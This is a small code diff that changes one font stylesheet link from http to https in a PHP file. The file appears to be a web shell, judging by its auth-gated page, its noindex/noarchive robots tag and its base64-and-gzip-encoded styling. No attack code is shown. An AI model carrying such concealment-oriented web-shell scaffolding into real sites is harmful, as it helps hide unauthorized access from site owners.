@@ -2202,7 +2202,7 @@ if($s_auth){
 <title><?php echo $s_title; ?></title>
 <meta name='robots' content='noindex, nofollow, noarchive'>
 <link rel='shortcut icon' href='<?php echo $s_favicon; ?>'>
-<link href='http://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700' rel='stylesheet' type='text/css'>
+<link href='https://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700' rel='stylesheet' type='text/css'>
 <style type='text/css'>
 <?php
 	$s_css = gzinflate(base64_decode($s_style));
